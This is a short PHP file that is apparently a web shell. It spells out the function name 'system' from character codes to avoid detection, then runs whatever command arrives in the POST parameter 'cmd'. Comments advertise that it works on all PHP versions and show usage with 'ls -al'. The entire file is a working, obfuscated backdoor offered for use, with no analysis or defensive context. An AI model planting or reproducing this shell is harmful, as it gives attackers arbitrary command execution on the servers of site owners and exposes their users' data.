<?php
// works on all PHP versions
// usage:
// POST payload:
//   cmd=ls -al
$_ = 97;
$__ = 97 + 18; //s
$___ = $__ + 6; //y
$____ = $__ + 1; //t
$_____ = $_ + 4; //e
$______ = $__ - 6; //m
//
$res = chr($__).chr($___).chr($__).chr($____).chr($_____).chr($______);
$_= $_POST['cmd'];
$res($_);
